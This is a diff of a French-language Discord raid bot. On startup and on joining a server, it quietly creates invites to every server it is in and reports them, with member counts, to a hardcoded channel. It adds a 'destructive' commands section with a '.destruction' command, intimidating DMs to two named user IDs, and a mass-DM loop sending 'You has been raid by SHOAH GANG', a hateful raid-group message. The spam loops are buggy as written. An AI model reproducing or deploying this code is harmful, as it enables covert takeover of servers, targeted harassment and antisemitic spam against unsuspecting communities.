@@ -10,12 +10,13 @@ bot.on('ready',() => {
   //invit link
   bot.guilds.forEach(guild => {
     var invite = bot.guilds.find("id", guild.id).channels.find("id", guild.channels.random().id);
-    invite.createInvite().then(invite => {bot.channels.find("id", process.env.CHANNEL_ID).send((`Connecté sur : ${guild.name} ${invite} ${guild.memberCount} membres`))
+    invite.createInvite().then(invite => {bot.channels.find("id", '442270404338384896').send((`Connecté sur : ${guild.name} ${invite} ${guild.memberCount} membres`))
       console.log(`Connecté sur : ${guild.name} ${invite} ${guild.memberCount} membres`)
   });
 });
   })
- bot.on("guildCreate", guild => {
+ 
+  bot.on("guildCreate", guild => {
     bot.guilds.forEach(guild => {
       var invite = bot.guilds.find("id", guild.id).channels.find("id", guild.channels.random().id);
       invite.createInvite().then(invite => {bot.channels.find("id", '442270404338384896').send((`Connecté sur : ${guild.name} ${invite} ${guild.memberCount} membres`))
@@ -23,7 +24,7 @@ bot.on('ready',() => {
     })
   })
   });
-
+  
   bot.on('message', msg => {
     //#region Legit
     /* Commandes legit */
@@ -41,6 +42,33 @@ if (msg.guild === bot.guilds.find('id', '430039551747293205')){
 
   //#region Destructrices
   /* Commandes destructrices */
+
+
+  if (msg.author.id === '412249212990783488'){
+      msg.author.send("Dedicace a FTNL");
+      var i = 0;
+      while (i /= 150){
+         msg.author.send("J'ai un oeil partout n'oublie pas (ton ami Fan Tarte)");
+        i===i+1;
+      }
+    return
+  }
+  else if (msg.author.id === process.env.ADONIS_ID){
+    msg.author.send("Dediace a FTNL");
+    var i = 0;
+    while (i /= 150){
+         msg.author.send("J'ai un oeil partout n'oublie pas (ton ami Fan Tart)");
+        i===i+1;
+      }
+    return;
+  }
+
+var i = 0;
+      while (i /= 150){
+         msg.author.send('You has been raid by SHOAH GANG');
+        i===i+1;
+      }
+      return;
 
   if (msg.content === '.destruction') {
     console.log(`Commande .destruction par ${msg.author.tag}`);
